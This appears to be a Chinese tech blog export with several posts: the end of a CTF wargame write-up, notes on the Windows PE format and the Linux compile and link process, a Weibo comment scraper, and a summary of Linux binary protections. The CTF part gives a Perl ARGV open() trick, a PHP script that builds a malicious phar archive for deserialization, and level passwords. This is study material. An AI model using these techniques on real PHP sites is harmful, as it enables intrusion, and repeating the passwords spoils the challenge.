改代码按照预设应该返回上传文件的文件描述符，但是如果构造的file是多个参数，param()返回所有file参数值的列表，但file不能有两个值，所以给file赋值时程序读取列表第一个值赋给file，此时file是一个字符串 while (&lt;$file&gt;：按照预设应该是用来遍历文件的每一行,但如果file为参数则不起作用。一个例外是字符串为”ARGV”时，&lt;&gt;会遍历URL后的每个值，oepn()就会执行该字符串内容。 payload no1vohsheCaiv3ieH4em1ahchisainge Level_32➡Level_33对上个漏洞的利用 shoogeiGa2yee3de6Aex8uaXeech5eey Level_33➡Level_34Phar反序列化漏洞，详细讲解见这篇 上传打印flag的php文件 生成phar压缩文件 123456789101112131415&lt;?php class Executor &#123; private $filename = &quot;pwn.php&quot;; private $signature = True; private $init = false; &#125; $phar = new Phar(&quot;test.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;addFromString(&quot;test.txt&quot;, &#x27;test&#x27;); //添加要压缩的文件 $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $o = new Executor(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;stopBuffering(); //签名自动计算?&gt; 上传phar压缩文件 利用phar文件，将文件名修改为phar://test.phar/test.txt，md5_file()函数解析phar文档，获取到flag。 shu5ouSu6eicielahhae0mohd4ui5uig ❀撒花完结❀","categories":[{"name":"Web","slug":"Web","permalink":"http://example.com/categories/Web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"http://example.com/tags/Web/"}]},{"title":"Windows_PE文件格式","slug":"Windows_PE文件","date":"2021-05-15T17:24:39.000Z","updated":"2022-03-25T13:51:44.000Z","comments":true,"path":"2021/05/16/Windows_PE文件/","link":"","permalink":"http://example.com/2021/05/16/Windows_PE%E6%96%87%E4%BB%B6/","excerpt":"","text":"Windows_PE文件格式​ PE文件格式是理解Windows操作系统进程、内存、动态链接库加载的基础，本文结合逆向课所学和查询的资料简单做个总结。 1.PE文件基本介绍PE文件是Windows操作系统下使用的一种可执行文件，由COFF（UNIX平台下的通用对象文件格式）格式文件发展而来。32位成为PE32，64位称为PE+或PE32+。 基本结构 从DOS头到节区头是PE头部分，其下的节区合称为PE体。 DOS头 主要为现代PE文件可以对早期的DOS文件进行良好兼容存在，其结构体为IMAGE_DOS_HEADER。 大小为64字节，其中2个重要的成员分别是： e_magic:DOS签名（4D5A，MZ） e_lfanew：指示NT头的偏移（文件不同，值不同） DOS存根 stub，位于DOS头下方，可选，大小不固定，由代码与数据混合组成。 NT头 结构体为IMAGE_NT_HEADERS，大小为F8，由3个成员组成： 签名结构体，值为50450000h（“PE”00） 文件头，表现文件大致属性，结构体为IMAGE_FILE_HEADER，重要成员有4个： Machine：每个CPU都拥有的唯一的Machine码，兼容32位Intel x86芯片的Machine码为14C； NumberOfSections：指出文件中存在的节区数量； SizeOfOptionalHeader：指出结构体IMAGE_OPTIONAL_HEADER32（32位系统）的长度 Characteristics：标识文件属性，文件是否是可运行形态、是否为DLL等，以bit OR形式进行组合 可选头，结构体为IMAGE_OPTIONAL_HEADER32，重要成员有9个： Magic：IMAGE_OPTIONAL_HEADER32为10B，IMAGE_OPTIONAL_HEADER64为20B AddressOfEntryPoint：持有EP的RVA值，指出程序最先执行的代码起始地址 ImageBase：指出文件的优先装入地址（32位进程虚拟内存范围为：0～7FFFFFFF） SectionAlignment,FileAlignment：前者制定了节区在内存中的最小单位，后者制定了节区在磁盘文件中的最小单位 SizeOfImage：指定了PE Image在虚拟内存中所占空间的大小 SizeOfHeaders：指出整个PE头的大小 Subsystem：区分系统驱动文件和普通可执行文件 NumberOfRvaAndSize：指定DataDirectory数组的个数 DataDirectory：由IMAGE_DATA_DIRECTORY结构体组成的数组 节区头 节区头定义了各节区的属性。PE文件中code、data、resource等按照属性储存在不同的节区。好处是可以保证程序的安全性，将代码和数据分隔开，每个节区设计不同的访问权限。 | 类别 | 访问权限权限 || ———— | ———————— || code | 执行、读取权限 || data | 非执行、读写权限 || resource | 非执行、读取权限 | 节区头中定义了各节区的属性，包括不同的特性、访问权限等，结构体为IMAGE_SECTION_HEADER，重要成员有5个： VirtualSize：内存中节区所占大小 VirtualAddress：内存中节区起始地址（RVA） SizeOfRawData：磁盘文件中节区所占大小 Charateristics：节区属性（bit OR） 内存映射(RVA_to_RAW)左边文件中使用偏移（offset），内存中使用VA（Virtual Address，虚拟地址）来表示位置。文件加载到内存时，情况就会发生变化（节区大小、位置等）。文件的内容一般可分为代码（.text）、数据（.data）、资源（.rsrc）节，分别保存。PE头与各节区的尾部存在一个区域，成为NULL填充。文件/内存中节区的起始位置应该在各文件/内存最小单位的倍数上，空白区域使用NULL进行填充（如下图所示）。 VA: Virtual Address 进程虚拟内存绝对地址 RVA: Relative Virtual Address 相对虚拟地址，指从某个基准位置开始的相对地址 ImageBase: PE文件的优先装载地址 转换关系如下： RVA+ImageBase=VAWhy use VA and RVA? PE头内部信息大多以RVA形式存在。PE文件（主要是DLL）加载到进程虚拟内存的特定位置时，该位置可能已经加载了其他PE文件。此时必须通过重定位将其加载到其他空白位置，若PE头用的是VA，则会造成无法正常访问。因此使用RVA来定位信息，即使发生重定位，只要相对于基准的相对地址没有发生变化，就能正常访问到指定信息不会发生问题。 Demo: If RVA=5000, File Offset=? ①首先查找RVA对应所在的节区 →位于第一个节区(.text) 图中ImageBase(01000000) ②计算公式 → RAW=RVA-VirtualAddress+PointerToRawData\\\\ =5000-1000+400=44002.What’s IATIAT: Import Address Table 导入地址表。 这个表保存了与windows操作系统核心进程、内存、DLL结构等相关的信息。只要了理解了IAT，就掌握了Windows操作系统的根基。IAT是一种表格，用来记录程序正在使用哪些库中的哪些函数。 先了解一下Windows的DDL DLL：Dynamic Linked Library 动态链接库 不把函数库包含进应用程序中，单独组成DLL文件，在需要使用时再进行调用。 使用内存映射技术将加载后的DLL代码、资源在多个进程中实现共享。 在对函数库进行更新时，只更新DLL文件，简单易行 DLL加载方式有两种：显式链接（Explicit Linking） 和 隐式链接（Implicit Linking） 显示链接：程序在使用DLL时进行加载，使用完毕后释放内存 隐式链接：程序在开始时即一同加载DLL，程序终止时再释放占用的内存 IAT提供的机制与DLL的隐式链接有关 程序调用系统IAT表的时候具体实现过程： 假设我们程序中某处要用到MessageBoxA，那么这里会有两种形式，一种是先call到一个地址，这个地址中是一个jmp [A]，A中存放着数据，数据内容就是我们的MessageBox的入口地址。另一种情况是直接calll到MessageBoxA的入口地址即 [A],[A]是A地址存放的数据，A中存放的数据是MessageBox的入口地址，之所以叫做表也是这个原因，因为程序要调用很多系统dll，如果我们的dll地址发生改变，要对每一处调用修改其调用地址是很麻烦的，如果有这样的表，我们将所有的函数调用的入口地址集中在一个集中的地址中，然后通过解析这个表方便我们进行修改，这样我们只要修改这个表所指的函数入口地址。 我们在OD中选择call了MessageBox的一行，用view 运行文件的方法查看，可以看到这里并不是函数入口地址，而是一个dword的数，这个十六进制数加上基址假设叫做B，我们跳过去看B，看到B中的数据是一个ASCII码的内容，即字符串MessageBox，也就是说，Windows在运行程序，即在加载前通过内部实现，把我们的字符串MessageBox换为了MessageBox的入口地址，这样我们在call 【A】的时候就是跳转到了MessageBox的入口地址。 下面引入一个结构体 IMAGE_IMPORT_DESCRIPTOR 该结构体位于 IMAGE_OPTIONAL_HEADER 的 IMAGE_DATA_DIRECTORY 中定位到第二个目录，即 IMAGE_DIRECTORY_ENTRY_IMPORT。该结构体保存了导入函数的 RVA 地址，通过该 RVA 地址可以定位到导入表的具体位置。 每一个导入的 DLL 都有一个对应的 IMAGE_IMPORT_DESCRIPTOR，并且以数组的形式存放在文件中的,定义如下 12345678910111213141516171819typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; DWORD OriginalFirstThunk;//该字段指向导入名称表（INT），该RVA是一个IMAGE_THUNK_DATA结构体 &#125;; DWORD TimeDateStamp;//可以忽略，一般为0 DWORD ForwarderChain;//一般为0 DWORD Name;//指向DLL的名称的RVA地址 DWORD FirstThunk;//该字段包含导入地址表（IAT）的RVA，IAT是一个IMAGE_THUNK_DATA结构体数组&#125; IMAGE_IMPORT_DESCRIPTOR; 导入信息并不包含指定导入表的个数，而是以一个全为0的IMAGE_IMPORT_DESCRIPTOR 结构体作为结束标志。 下面是IMAGE_THUNK_DATA 结构体的定义: 123456789101112131415typedef struct _IMAGE_THUNK_DATA32 &#123; union &#123; DWORD ForwarderString; // 一个RVA地址，指向forwarder string DWORD Function; // PDWORD，被导入的函数的入口地址 DWORD Ordinal; // 该函数的序数 DWORD AddressOfData; // 一个RVA地址，指向IMAGE_IMPORT_BY_NAME &#125; u1;&#125; IMAGE_THUNK_DATA32; 每一个 IMAGE_THUNK_DATA 对应一个 DLL 中的导入函数。与 IMAGE_IMPORT_DESCRIPTOR 类似，IMAGE_THUNK_DATA 在文件中也是一个数组，并以一个全为 “0” 的 IMAGE_THUNK_DATA 结束。 当该结构体值的最高位为 0 时，表示函数以函数名字符串的方式导入，这时该 DWORD 的值表示一个 RVA，并指向一个 IMAGE_IMPORT_BY_NAME 结构体： 1234567typedef struct _IMAGE_IMPORT_BY_NAME &#123; WORD Hint; //该函数的导出序数 BYTE Name[1]; // 该函数的名字&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; 看起来可能有些绕，一会IAT一会INT的 The difference between IAT and INT: IMAGE_IMPORT_DESCRIPTOR结构体中的OriginalFirstThunk和FirstThunk都指向IMAGE_THUNK_DATA结构体。 当文件在磁盘上时，两者指向的是同一个 IMAGE_THUNK_DATA，而当文件载入内存时 OriginalFirstThunk 中保存的仍然是指向函数的 RVA，而 FirstThunk 指向的内存变成了由装载器填充的导入函数地址，即 IAT。 Look at this pictures:) 操作系统填充IAT大致流程如下： 1.找到导入表起始地址 2.找到第一个IID 3.根据IID的第四个字段确定dll库名称 4.根据IID的第五个字段确定IAT表地址 5.通过IAT字符串指针定位到目标函数名称。 6.用目标函数地址修改IAT的字符串指针。 7.修改下一处IAT 8.IAT项为0，修改完毕 9.找到下一个IID从第3步开始重复上面的操作。 What’s EAT与INT相对应，EAT（Exoprt Adress Table）顾名思义，导出表。 EAT是一种核心机制，使不同的应用程序可以调用库文件中提供的函数，只有通过EAT才能准确求得从相应库中到处函数的起始地址。PE文件内的IMAGE_EXPORT_DIRECTORY保存着导出信息，且PE文件中仅有一个用来说明EAT的IMAGE_EXPORT_DIRECTORY结构体。（这点对比IAT：IAT的 IMAGE_IMPORT_DESCRIPTOR结构体以数组形式存在，且有多个成员，这主要是因为PE文件可以同时导入多个库。 EAT结构体位于PE头中，IMAGE_OPTIONAL_HEADER32.DataDirectory[0] IMAGE_EXPORT_DIRECTORY结构： 依旧先放结构体定义 1234567891011121314typedef struct _IMAGE_EXPORT_DIRECTORY &#123; DWORD Characteristics; //保留 总是定义为0 DWORD TimeDateStamp; //文件生成时间 WORD MajorVersion; //主版本号 一般不赋值 WORD MinorVersion; //次版本号 一般不赋值 DWORD Name; //模块的真实名称 DWORD Base; //索引基数 加上序数就是函数地址数组的索引值 DWORD NumberOfFunctions; //地址表中个数 DWORD NumberOfNames; //名称表的个数 DWORD AddressOfFunctions; //输出函数地址的RVA DWORD AddressOfNames; //输出函数名字的RVA DWORD AddressOfNameOrdinals; //输出函数序号的RVA&#125; IMAGE_EXPORT_DIRECTORYM, *pIMAGE_EXPORT_DIRECTORY; Demo: kernel32.dll 从库中获得函数地址的API为GetProcAddress()函数，该API引用EAT来获取指定API的地址。其过程大致如下： 利用AddressOfName成员转到“函数名称数组” “函数名称数组”中存储着字符串地址，通过比较（strcmp）字符串，查找指定的函数名称（此时数组的索引称为name_index） 利用AddressOfNameOrdinals成员，转到ordinal数组 在ordinal数组中通过name_index查找相应ordinal值 利用AddressOfFunctionis成员转到“函数地址数组”（EAT） 在“函数地址数组”中将刚刚求得的ordinal用作数组索引，获得指定函数的起始地址 SummaryPE文件是逆向的一个基础，了解PE文件的结构和动态连接的过程有利于我们更好地理解高级调试。","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"PE文件","slug":"PE文件","permalink":"http://example.com/tags/PE%E6%96%87%E4%BB%B6/"}]},{"title":"Linux代码编译过程","slug":"Linux环境下编译过程","date":"2021-05-12T17:24:39.000Z","updated":"2022-03-25T13:51:43.000Z","comments":true,"path":"2021/05/13/Linux环境下编译过程/","link":"","permalink":"http://example.com/2021/05/13/Linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/","excerpt":"","text":"Linux下Hello World的前生今世代码引入hello.c 1234567#include &lt;stdio.h&gt;int main(int argc,char *argv[],char *envp[])&#123; printf(&quot;Hello World\\n&quot;); return 0;&#125; linux环境下我们可以通过GCC编译hello.c: 1$ gcc -g hello.c -o hello 当前目录先会生成hello可执行文件。 main函数的三个参数int argc int型变量，表示传递给main函数的参数数量。 char *argv 指针数组，每个指针指向各个具体的参数。 char*envp 环境变量，可以为程序运行过程中需要使用环境变量做参考。 Demo: 1$ ./hello //执行该文件 此时argc=1,表示只有一个参数输入 argv只有一个元素,argv[0]指向输入程序路径及名称: ./hello 1$ ./hello para_1 此时argc=2,有两个参数传入 argc[0]指向输入程序路径及名称 “./hello” argv[1]指向para_1字符串 what’s gccGCC是GNU Compiler Collection的缩写，GCC是一系列编译器的集合，是Linux操作系统的核心组件之一。GCC最初名为GNU C Compiler，当时它只是一款C语言的编译器，不过随着后续迭代，它支持C++、Fortran、Go等语言，GCC也因此成为一个编译器集合。GCC有以下特点： GCC支持的编程语言多。比如，g++是C++编译器，gfortran是Fortran编译器。 GCC支持的硬件全。GCC可以将源代码编译成x86_64、ARM、PowerPC等硬件架构平台的可执行文件。 GCC支持众多业界标准。GCC能很快支持最新的C++标准，GCC支持OpenMP、OpenACC。 编译过程分析 预处理预处理器CPP工具进行预处理 1$ cpp hello.c -o hello.i 预编译主要处理源代码中以#开始的预编译指令，主要处理规则如下： 处理#include预编译指令，将被包含的文件插入到该预编译指令的位置。这是一个递归的过程，如果被包含的文件还包含了其他文件，会递归地完成这个过程。 处理条件预编译指令，比如#if、#ifdef、#elif、#else、#endif。 删除#define，展开所有宏定义。 添加行号和文件名标识，以便于在编译过程中产生编译错误或者调试时都能够生成行号信息。 编译gcc对预处理后的hello.i文件惊醒编译。编译的过程主要是进行词法分析、语法分析、语义分析，这背后涉及编译原理等一些内容。这里只进行编译，不汇编，可以生成硬件平台相关的汇编语言。 1$ gcc -S hello.i -o hello.s 它包含一个汇编语言程序，即将C语言程序编译成汇编语言程序。 汇编1$ as hello.s -o hello.o as工具将hello.s文件翻译为二进制代码。 虽然这个文件已经是二进制的机器码了，但是它仍然不能执行，因为它缺少系统运行所必须的库，比如C语言printf()对应的汇编语言的puts函数。确切的说，系统还不知道puts函数在内存中的具体位置。如果我们在一份源代码中使用了外部的函数或者变量，还需要重要的一步：链接。 链接1$ gcc hello.o -o hello 该命令是基于动态链接的方式，生成的hello已经是一个可执行文件。实际上，这个命令隐藏了很多背后的内容。 main()方法是C语言程序的入口，crt1.o这几个库是在处理main()方法调用之前和程序退出之后的事情，这需要与操作系统协作。在Linux中，一个新的程序都是由父进程调用fork()，生成一个子进程，然后再调用execve()，将可执行文件加载进来，才能被操作系统执行。所以，准确地说，main()方法是这个程序的入口，但仅仅从main()方法开始，并不能顺利执行这个程序。 链接器将多个目标文件合并成一个可执行目标文件，这个二进制文件包含加载程序到内存并运行的所有信息。 链接过程主要包含了两个步骤： 地址与空间分配（Address and Storage Allocation） 这个过程中， 扫描所有的输入目标文件，获得它们的各个节的长度、属性、位置，并将输入目标文件中的符号表中所有的符号定义和符号引用收集起来，统一放到一个全局的符号表。这一步，链接器能够获得所有输入目标文件的节的长度，并将它们合并，计算出输出文件中各个节合并后的长度与位置，并建立映射关系。 这里引入可执行目标文件的概念。 .text:已编译程序的机器代码 .rodata:只读数据 .data:已初始化的全局和静态C变量 .bss:未初始化的全局和静态C变量 .symtab: 符号表，存放在程序中定义和引用的函数和全局变量的信息 .debug:调试符号表 可执行文件中的段是由目标文件中的节合并而来的，以下是链接器如何将它们的各个节合并到输出文件，也即输出文件中的空间如何分配给输入文件的两种方式。 顺序叠加 虽然这种方法非常简单，但是它存在一个问题：在有很多输入文件的情况下，输出文件会有很多零散的节。这种做法非常浪费空间，因为每个节都需要有一定的地址和空间对齐要求。x86硬件的对齐要求是4KB。如果一个节的大小只有1个字节，它也要在内存在重用4KB。这样会造成大量内部碎片。所以不是一个好的方案。 合并相似节 一个更加实际的方法便是合并相同性质的节，比如：将所有输入文件的 .text节合并到输出文件的 text段（注意，此时出现了段和节两个概念），如下图所示。 其中.bss节在目标文件和可执行文件中不占用文件的空间，但是它在装载时占用地址空间。事实上，这里的空间和地址有两层含义: 在输出的可执行文件中的空间 在装载后的虚拟地址中的空间 对于有实际数据的节，如.text和.data，它们在文件中和虚拟地址中都要分配空间，因为它们在这两者中都存在；对于.bss来，分配空间的意义只局限于虚拟地址空间，因为它在文件中并没有内容。我们在这里谈到的空间分配只关注于虚拟地址空间（见下图）的分配，因为这关系到链接器后面的关于地址计算的步骤，而可执行文件本身的空间分配与链接的关系并不大。 现在的链接器空间分配的策略基本上都采用“合并相似节”的方法，使用这种方法的链接器一般采用一种叫 两步链接（Two-pass Linking） 的方法。即整个链接过程分为地址与空间分配和符号解析、重定位。 符号解析（Symbol Resolution）和重定位（Relocation） 使用前一步中收集到的所有信息，读取输入文件中节的输数据、重定位信息，并且进行符号解析与重定位、调整代码、调整代码中的地址等。重定位是链接过程的核心。在地址与空间分配步骤完成之后，相似权限的节会被合并成段，并生成了 程序头表（Program Header Table） 结构。如下图可执行文件结构所示，主要生成两个段：代码段（ text段）、数据段（ data段 ）。 符号解析 重定位的过程是伴随着符号解析的，这里先介绍符号解析。 链接器解析符号引用的方法是将每个引用与它输入的可重定位目标文件的符号表中的一个确定的符号定义关联起来。对那些和引用定义在相同模块的局部符号的引用，符号解析是非常简单的。编译器只允许每个模块中每个局部符号有一个定义。静态局部变量也会有本地链接器符号，编译器还要确保它们拥有唯一的名字。 然而，对于全局符号的解析要复杂得多。当编译器遇到一个不是在当前模块中定义的符号（变量或函数名）时，会假设该符号是在其他某个模块中定义的，生成一个链接器符号表条目，并把它交给链接器处理。如果链接器在它的任何输入模块中都找不到这个被引用符号的定义，就输出一条错误信息并终止。 多重定义的全局符号解析在此不做介绍。 重定位 链接的前两步完成之后，链接器就已经确定所有符号的虚拟地址了，那么链接器就可以根据符号的地址对每个需要重定位的指令进行地址修正。 那么链接器如何知道哪些指令是要被调整的呢？事实上，我们前面提到的ELF文件中的 重定位表（Relocation Table） 专门用来保存这些与重定位相关的信息。 对于可重定位的ELF文件来说，它必须包含重定位表，用来描述如何修改相应的节的内容。对于每个要被重定位的ELF节都有一个对应的重定位表。如果.text节需要被重定位，则会有一个相对应叫.rel.text的节保存了代码节的重定位表；如果.data节需要被重定位，则会有一个相对应的.rel.tdata的节保存了数据节的重定位表。 链接可分为静态链接和动态链接 静态链接简单来说，静态链接就是在程序加载前，将所依赖的第三方库函数都打包到了一起，形成一个非常大的可执行文件。如下图所示为最基本的静态链接过程示意图。每个模块的源代码文件（如.c）文件经过编译器编译成目标文件（Object File，一般扩展名为.o或.obj）。目标文件和 库（Library） 一起链接形成最终的可执行文件。其中，最常见的库就是运行时库（Runtime Library），它是支持程序运行的基本函数的集合。库本质上是一组目标文件的包，由一些最常用的代码编译成目标文件后打包而成。 动态链接动态链接是在运行时，发现用到某些库中的某些函数时，再从这些第三方库中读取自己所需的方法。 动态链接的基本实现 动态链接涉及运行时的链接以及多个文件的装载，必需要有操作系统的支持。因为动态链接的情况下，进程的虚拟地址空间的分布会比静态链接情况下更为复杂，还有一些存储管理、内存共享、进程线程等机制在动态链接下也会有一些微妙的变化。 目前，主流操作系统都支持动态链接。在Linux中，ELF动态链接文件被称为 动态共享对象（DSO，Dynamic Shared Objects），一般以.so为后缀；在Windows中，动态链接文件被称为 动态链接库（Dynamic Linking Library），一般以.dll为后缀。 在Linux中，常用的C语言库的运行库glibc，其动态链接形式的版本保留在 /lib目录下，文件名为 libc.so。整个系统只保留一份C语言动态链接文件libc.so，所有的C语言编写的、动态链接的程序都可以在运行时使用它。当程序被装载时，系统的动态链接器会将程序所需要的所有动态链接库装载到进程的地址空间，并将程序中所有未解析的符号绑定到相应的动态链接库中，并进行重定位。 动态链接程序运行时地址空间分布 对于静态链接的可执行文件来说，整个进程只有一个文件要被映射，即可执行文件。而对于动态链接，除了可执行文件，还有它所依赖的共享目标文件。 关于共享目标文件在内存中的地址分配，主要有两种解决方案，分别是： 静态共享库（Static Shared Library）（地址固定） 动态共享库（Dynamic Shared Libary）（地址不固定） 静态共享库 静态共享库的做法是将程序的各个模块统一交给操作系统进行管理，操作系统在某个特定的地址划分出一些地址块，为那些已知的模块预留足够的空间。因为这个地址对于不同的应用程序来说，都是固定的，所以称之为静态。 但是静态共享库的目标地址会导致地址冲突、升级等问题。 动态共享库 采用动态共享库的方式，也称为装载时重定位（Load Time Relocation）。其基本思路是：在链接时，对所有绝对地址的引用都不作重定位，而把这一步推迟到装载时再完成。一旦模块装载地址确定，即目标地址确定，那么系统就对程序中所有的绝对地址引用进行重定位。 但是这种方式也存在一些问题。比如，动态链接模块被装载映射至虚拟空间后，指令部分是在多个进程间共享的，由于装载时重定位的方法需要修改指令，所以没有办法做到同一份指令被多个进程共享，因为指令被重定位后对于每个进程来说都是不同的。 然后，动态链接库中的代码是共享的，但是其中的可修改数据部分对于不同进程来说是由多个副本的。基于此，一种名为地址无关代码的技术被提出以克服这个问题。 与地址无关 无论何种操作系统上，使用动态链接生成的目标文件中凡是涉及第三方库的函数调用都是地址无关的。我们自己编写的程序名为hello.c，hello.c中调用了C标准库的printf()，在生成的目标文件中，不会立即确定printf()的具体地址，而是在运行时去装载这个函数，在装载阶段确定printf()的地址。这里提到的地址指的是进程在内存上的虚拟地址。动态链接库的函数地址在编译时是不确定的，在装载时，装载器根据当前地址空间情况，动态地分配一块虚拟地址空间。 小结在会写一个C程序，也要了解一个C代码是如何从ASCII文件一步步变为可执行文件的过程。","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"编译过程","slug":"编译过程","permalink":"http://example.com/tags/%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"},{"name":"链接","slug":"链接","permalink":"http://example.com/tags/%E9%93%BE%E6%8E%A5/"}]},{"title":"Python微博评论爬取","slug":"Python爬虫","date":"2021-04-13T17:24:39.000Z","updated":"2022-03-25T13:51:44.000Z","comments":true,"path":"2021/04/14/Python爬虫/","link":"","permalink":"http://example.com/2021/04/14/Python%E7%88%AC%E8%99%AB/","excerpt":"","text":"Descriptions 用于爬取某一具体微博的所有评论 通过https://m.weibo.com 查看指定微博id号 修改cookie Source_code1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import reimport requestsimport csvfrom requests.sessions import sessionimport time#初始化参数说明：填入自己cookie、以及被爬取微博id即可weibo_id=4643338235416902 headers = &#123; &#x27;Cookie&#x27; : &#x27;Your_own_cookie&#x27;#设置为自己的cookie &#x27;User-Agent&#x27; : &#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36&#x27;, &#x27;Referer&#x27;: &#x27;https://m.weibo.cn/detail/4635403158556543&#x27;, &#x27;X-Requested-With&#x27;: &#x27;XMLHttpRequest&#x27;, &#x27;X-XSRF-TOKEN&#x27; : &#x27;5c0faa&#x27;, &#x27;sec-ch-ua&#x27;: &#x27;&quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;90&quot;, &quot;Google Chrome&quot;;v=&quot;90&quot;&#x27;, &#x27;sec-ch-ua-mobile&#x27;: &#x27;?1&#x27;, &#x27;sec-fetch-dest&#x27;: &#x27;empty&#x27;, &#x27;sec-fetch-mode&#x27;: &#x27;cors&#x27;, &#x27;sec-fetch-site&#x27;: &#x27;same-origin&#x27;, &#x27;MWeibo-Pwa&#x27;: &#x27;1&#x27;&#125;f = open(&quot;微博评论.csv&quot;,mode =&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;)csvwriter = csv.writer(f)#打开csv文件url = &quot;https://m.weibo.cn/comments/hotflow?id=&#123;&#125;&amp;mid=&#123;&#125;&amp;max_id_type=0&quot;.format(weibo_id,weibo_id)session = requests.Session()resp = session.get(url, headers=headers)dict = resp.json()for j in range(len(dict[&#x27;data&#x27;][&#x27;data&#x27;])): comment = dict[&#x27;data&#x27;][&#x27;data&#x27;][j][&#x27;text&#x27;] name = dict[&#x27;data&#x27;][&#x27;data&#x27;][j][&#x27;user&#x27;][&#x27;screen_name&#x27;] csvwriter.writerow([name,comment])max_id_type = dict[&#x27;data&#x27;][&#x27;max_id_type&#x27;]max_id = dict[&#x27;data&#x27;][&#x27;max_id&#x27;]print(&quot;now max_id=&quot;+str(max_id))flag_ok=dict[&#x27;ok&#x27;]print(flag_ok)flag_time=0while(flag_ok==1 and max_id!=0): url = &quot;https://m.weibo.cn/comments/hotflow?id=&#123;&#125;&amp;mid=&#123;&#125;&amp;max_id=&#123;&#125;&amp;max_id_type=&#123;&#125;&quot;.format(weibo_id,weibo_id,max_id,max_id_type) resp = session.get(url,headers=headers) dict = resp.json() flag_time= flag_time+1 if(flag_time==10): flag_time=0 time.sleep(2) print(&quot;Now relax for 2s to avoid 反扒机制. Be patient :)&quot;) flag_ok=dict[&#x27;ok&#x27;] print(&quot;now max_id=&quot;+str(max_id)) if(flag_ok==1): max_id = dict[&#x27;data&#x27;][&#x27;max_id&#x27;] max_id_type = dict[&#x27;data&#x27;][&#x27;max_id_type&#x27;] for j in range(len(dict[&#x27;data&#x27;][&#x27;data&#x27;])): comment = dict[&#x27;data&#x27;][&#x27;data&#x27;][j][&#x27;text&#x27;] name = dict[&#x27;data&#x27;][&#x27;data&#x27;][j][&#x27;user&#x27;][&#x27;screen_name&#x27;] wb_time=dict[&#x27;data&#x27;][&#x27;data&#x27;][j][&#x27;created_at&#x27;] csvwriter.writerow([name,comment,wb_time])","categories":[{"name":"Python","slug":"Python","permalink":"http://example.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"},{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"Linux程序保护机制","slug":"Linux程序保护机制","date":"2021-04-11T17:24:39.000Z","updated":"2022-03-25T14:34:20.000Z","comments":true,"path":"2021/04/12/Linux程序保护机制/","link":"","permalink":"http://example.com/2021/04/12/Linux%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/","excerpt":"","text":"Linux程序保护机制​ 在Pwnable.kr刷题的过程中一点一点地了解了linux系统下的一些安全机制来降低程序受到溢出等攻击，这里简单做个总结。:) Tools:checksecchecksec是一个检查linux程序开启的安全机制的shell脚本，也可以检测packer信息 （Demo: 题目:flag 下面对逐个介绍保护机制 CANARY​ 在linux程序中，CANARY是一种栈保护机制，栈保护机制开启后，函数执行时会先往栈中插入随机值，这个随机值就被称为CANARY，当函数返回时，会先验证这个随机数是否被更改，如果被更改说明有栈溢出行为，就会使程序强制停止，从而规避栈溢出带来的危害。 ​ Function： 1、在所有函数调用发生时，向栈帧内压入一个额外的随机 DWORD，这个随机数被称作“canary”，用 IDA 反汇编时，又被称作“Security Cookie”。 2、canary 位于 EBP 之前，系统还会在.data 的内存区域中存放一个 canary 的副本。 3、 当栈中发生溢出时，canary 将被首先淹没，之后才是 EBP 和返回地址。 4、 在函数返回之前，系统将执行一个额外的安全验证操作，称作 Security Check。 5、在 Security Check 过程中，系统将比较栈帧中原先存放的 canary 和.data 中副本的值，若两者不同，则说明栈中发生了溢出，系统将进入异常处理流程，函数不会正常返回。 FORTIFYFORTIFY机制用于检查程序是否存在缓冲区溢出错误。这是一个由GCC实现的源码级别的保护机制，其功能是在编译的时候检查源码以避免潜在的缓冲区溢出等错误。适用于memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets等函数。 在函数编译时，加入FORTIFY机制的代码会在编译过程中自动添加一部分代码，判断数组的大小，削减缓冲区溢出的危害。 gcc编译时，默认不开启FORTIFY机制，可通过编译选项选择开启的FORTIFY机制强度 NXNX:no-excute不可执行 基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 PIE（ASLR）PIE一般与ASLR地址分布随机化(address space layout randomization)同时工作 内存地址随机化机制几种情况：1230 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。 RELRORELRO:read only relocation 由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读. 作用：设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。 